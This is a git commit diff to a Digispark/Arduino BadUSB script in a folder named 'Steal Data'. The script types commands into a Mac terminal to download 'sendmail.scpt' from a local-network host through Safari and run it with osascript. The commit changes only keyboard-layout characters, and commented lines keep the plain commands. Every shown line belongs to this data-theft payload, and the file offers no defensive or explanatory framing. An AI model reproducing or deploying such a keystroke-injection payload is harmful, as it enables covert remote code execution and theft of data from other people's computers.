3b1e91fcebbd7a48c9d555dccc7cb7e5ad26ef52
Hau Trung Nguyen <haunt.hcm2015@gmail.com>
2019-02-01 15:30:22 +0700

    Update boardscript.ino

--- Steal Data/boardscript.ino
+++ Steal Data/boardscript.ino
@@ -16,12 +16,12 @@ DigiKeyboard.delay(1000);
 DigiKeyboard.println("terminal");
 DigiKeyboard.delay(1000);
 // DigiKeyboard.println("open -a safari http://192.168.0.180/sendmail.scpt");
-DigiKeyboard.println("open /a safari http>&&192.168.0.180&sendmail.scpt");
+DigiKeyboard.println("open /a safari http> && 192.168.0.180 & sendmail.scpt");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT); // close Safari
 DigiKeyboard.delay(1000);
 // DigiKeyboard.println("osascript Downloads/sendmail.scpt");
-DigiKeyboard.println("osascript Downloads&sendmail.scpt");
+DigiKeyboard.println("osascript Downloads & sendmail.scpt");
 DigiKeyboard.delay(9000);
 DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT); // close Terminal
 DigiKeyboard.delay(1000);
